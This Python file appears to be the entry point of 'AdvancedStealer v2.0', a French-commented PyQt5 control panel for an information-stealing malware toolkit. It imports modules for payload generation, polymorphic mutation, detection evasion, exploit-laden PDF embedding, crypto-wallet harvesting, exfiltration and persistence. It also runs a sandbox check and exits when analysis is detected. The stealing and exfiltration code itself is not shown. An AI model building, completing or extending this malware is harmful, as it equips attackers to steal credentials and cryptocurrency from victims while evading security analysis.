#!/usr/bin/env python3
# main.py - Point d'entrée principal d'AdvancedStealer v2.0
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

import logging
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMessageBox
from PyQt5.QtCore import Qt, pyqtSignal, QObject

# Import des modules internes
from core.payloads import PayloadFactory
from core.polymorphic_engine import MutationEngine
from evasion.evade_detection import EvasionTools
from exploit.pdf_embedder import PDFEmbedder
from crypto_harvesting.wallet_hunter import WalletHunter
from exfil.exfiltration_methods import Exfiltrator
from persistence.persistence_methods import Persistence
from gui.ui.main_window import AdvancedStealerGUI
from core.controller import MainController

class Application(QObject):
    """Classe principale de l'application avec gestion des signaux"""
    
    module_executed = pyqtSignal(str, bool)
    config_loaded = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.controller = MainController()
        self.gui = AdvancedStealerGUI()
        
        # Configuration initiale
        self.configure_logging()
        self.setup_connections()
        
    def configure_logging(self):
        """Configure le système de logging"""
        logging.basicConfig(
            filename='advanced_stealer.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
    def setup_connections(self):
        """Connecte les signaux entre GUI et contrôleur"""
        # Signaux GUI vers contrôleur
        self.gui.execute_module.connect(self.controller.execute_module)
        self.gui.save_config.connect(self.controller.save_configuration)
        self.gui.load_config.connect(self.controller.load_configuration)
        
        # Signaux contrôleur vers GUI
        self.controller.execution_result.connect(self.gui.update_results)
        self.controller.log_message.connect(self.gui.append_log)
        self.controller.module_loaded.connect(self.gui.enable_module_ui)

    def run(self):
        """Lance l'application"""
        self.gui.show()
        
if __name__ == "__main__":
    try:
        # Vérification des prérequis
        if not EvasionTools.is_sandbox():
            app = QApplication(sys.argv)
            application = Application()
            application.run()
            sys.exit(app.exec_())
        else:
            QMessageBox.critical(
                None,
                "Erreur d'exécution",
                "Détection d'environnement sandbox - Arrêt immédiat",
                QMessageBox.Ok
            )
            sys.exit(1)
            
    except Exception as e:
        logging.critical(f"Erreur critique: {str(e)}", exc_info=True)
        QMessageBox.critical(
            None,
            "Erreur Fatale",
            f"Une erreur critique est survenue:\n{str(e)}",
            QMessageBox.Ok
        )
        sys.exit(1)


